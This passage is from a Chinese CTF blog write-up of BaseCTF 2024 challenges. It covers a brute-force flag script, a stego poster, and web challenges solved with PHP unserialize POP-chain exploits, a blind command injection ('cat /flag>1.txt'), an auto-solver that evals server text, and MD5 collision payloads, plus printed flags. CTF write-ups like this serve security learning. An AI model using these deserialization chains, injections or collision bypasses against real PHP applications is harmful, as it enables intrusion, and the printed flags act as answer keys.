结构</span><br>flag = <span class="hljs-string">&#x27;BaseCTF&#123;s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x&#125;&#x27;</span><br><br><span class="hljs-comment"># 定义我们将尝试的字符集</span><br>charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span><br><br><span class="hljs-comment"># 计算函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_sum</span>(<span class="hljs-params">chars</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chars))<br><br><span class="hljs-comment"># 生成所有可能的组合并测试</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br>    <span class="hljs-keyword">if</span> calculate_sum(candidate) == target_value:<br>        <span class="hljs-comment"># 找到符合条件的组合，更新 flag</span><br>        flag = flag[:<span class="hljs-number">17</span>] + candidate + flag[<span class="hljs-number">20</span>:]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found correct sequence: <span class="hljs-subst">&#123;candidate&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Correct flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid sequence found.&quot;</span>)<br><span class="hljs-comment">#BaseCTF&#123;s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x&#125;</span><br></code></pre></td></tr></table></figure>
<h3 id="倒计时海报"><a class="markdownIt-Anchor" href="#倒计时海报"></a> 倒计时？海报！</h3>
<p>配合stegsolve即可正确食用，一开始一直没写听说废眼，真正做的话十分钟以内估计就解决了附上各个对应的截图</p>
<img src="/../../images/basectf/basectf2024/haibao1.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao2.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao3.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao4.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao5.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao6.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao7.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao8.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao9.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<img src="/../../images/basectf/basectf2024/haibao10.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
<p><strong>BaseCTF{c0unt_d0wn_fro3_X_every_d@y_i5_re@11y_c0o1_@nd_h@rd_t0_do_1t_ev3ry_n1ght}</strong></p>
<h3 id="喵喵太可爱了"><a class="markdownIt-Anchor" href="#喵喵太可爱了"></a> 喵喵太可爱了</h3>
<p>跟着幸运儿拿的flag</p>
<p><strong>BaseCTF{m1a0_mi@o_1s_n0t_a_b3tr4yer_t0_t3l1_the_f1ag}</strong></p>
<h1 id="week2以后只写web了orz"><a class="markdownIt-Anchor" href="#week2以后只写web了orz"></a> week2(以后只写web了，orz)</h1>
<h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2>
<h3 id="ez_ser"><a class="markdownIt-Anchor" href="#ez_ser"></a> ez_ser</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">re</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chu0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;chu0))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I can not believes!&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;chu0-&gt;<span class="hljs-variable">$nononono</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kw</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dt</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;lalalla&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;kw;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ALL Done!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pwn</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dusk</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$over</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;dusk != <span class="hljs-string">&quot;gods&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;什么，你竟敢不认可?&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;over-&gt;<span class="hljs-title function_ invoke__">getflag</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nothing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy happy happy!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are over!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> web;<br><span class="hljs-variable">$exp</span>-&gt;kw = <span class="hljs-keyword">new</span> re;<br><span class="hljs-variable">$exp</span>-&gt;kw-&gt;chu0 = <span class="hljs-keyword">new</span> pwn;<br><span class="hljs-variable">$exp</span>-&gt;kw-&gt;chu0-&gt;over = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Misc</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure>
<h3 id="一起吃豆豆"><a class="markdownIt-Anchor" href="#一起吃豆豆"></a> 一起吃豆豆</h3>
<p>不能直接f12，可以用浏览器的开发者工具打开f12，看js代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">context.<span class="hljs-title function_">fillText</span>(_LIFE ? <span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;</span>) : <span class="hljs-string">&#x27;GAME OVER&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>);<br></code></pre></td></tr></table></figure>
<p>base64解一下就出来了</p>
<h3 id="happy-birthday"><a class="markdownIt-Anchor" href="#happy-birthday"></a> Happy Birthday</h3>
<p>尝试了一下发现要传pdf格式并且需要文件相同，可以参考我php绕过那篇文章，利用fastcoll.exe生成两个文件，得到flag</p>
<h3 id="你听不到我的声音"><a class="markdownIt-Anchor" href="#你听不到我的声音"></a> 你听不到我的声音</h3>
<p>这题考察的是这个函数没有直接的回显，可以重定向，利用&gt;得到flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=<span class="hljs-built_in">cat</span> /flag&gt;1.txt<br></code></pre></td></tr></table></figure>
<h3 id="really-ez-pop"><a class="markdownIt-Anchor" href="#really-ez-pop"></a> Really EZ POP</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;echo 123;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$nature</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Nature</span>;<br><span class="hljs-variable">$exp</span>-&gt;sea = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sea</span>;<br><span class="hljs-variable">$exp</span>-&gt;sea-&gt;see = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sink</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure>
<h3 id="rceisamazingwithspace"><a class="markdownIt-Anchor" href="#rceisamazingwithspace"></a> RCEisamazingwithspace</h3>
<p>过滤了空格，用常见的空格绕过就行</p>
<p>网上搜搜就行了，没什么好说的</p>
<h3 id="数学大师"><a class="markdownIt-Anchor" href="#数学大师"></a> 数学大师</h3>
<p>本体唯一的写脚本难度就是代码逻辑问题，本人写错的原因就是因为post了两次导致一直重复发包始终分数为1，就直接上exp了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:29992/&#x27;</span><br>session = requests.Session()<br>session.cookies.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>, <span class="hljs-string">&#x27;7ovv17kbkuh5f6pr1d2tbk07qt&#x27;</span>)<br>response = session.post(url)<br>math = re.search(<span class="hljs-string">r&#x27;second (\d+.+?)\?&#x27;</span>, response.text)<br>math = math.group(<span class="hljs-number">1</span>).strip()<br>math = math.replace(<span class="hljs-string">&#x27;÷&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>).replace(<span class="hljs-string">&#x27;×&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>answer = <span class="hljs-built_in">eval</span>(math)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">51</span>):<br>    post_data = &#123;<span class="hljs-string">&#x27;answer&#x27;</span>: answer&#125;<br>    post_response = session.post(url, data=post_data)<br>    math = re.search(<span class="hljs-string">r&#x27;second (\d+.+?)\?&#x27;</span>, post_response.text)<br>    math = math.group(<span class="hljs-number">1</span>).strip()<br>    math = math.replace(<span class="hljs-string">&#x27;÷&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>).replace(<span class="hljs-string">&#x27;×&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>    answer = <span class="hljs-built_in">eval</span>(math)<br>    <span class="hljs-built_in">print</span>(post_response.text)<br></code></pre></td></tr></table></figure>
<h3 id="所以你说你懂-md5"><a class="markdownIt-Anchor" href="#所以你说你懂-md5"></a> 所以你说你懂 MD5?</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 所以你说你懂 MD5 了?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;加强难度就不会了?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 什么? 你绕过去了?</span><br><span class="hljs-comment">// 加大剂量!</span><br><span class="hljs-comment">// 我要让他成为 string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;难吗?不难!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你还是绕过去了?</span><br><span class="hljs-comment">// 哦哦哦, 我少了一个等于号</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你以为这就结束了</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// 你想看到 random 的值吗?</span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5</span><br><span class="hljs-comment">// 那 flag 就给你吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p>第一层正常的数组绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apple[]=1&amp;banana[]=2<br></code></pre></td></tr></table></figure>
<p>第二层和第三层都强制转string了，可以利用到fastcoll来获得内容进行绕过，这里我直接用网上的了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">appple=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;bananana=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2&amp;apppple=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%9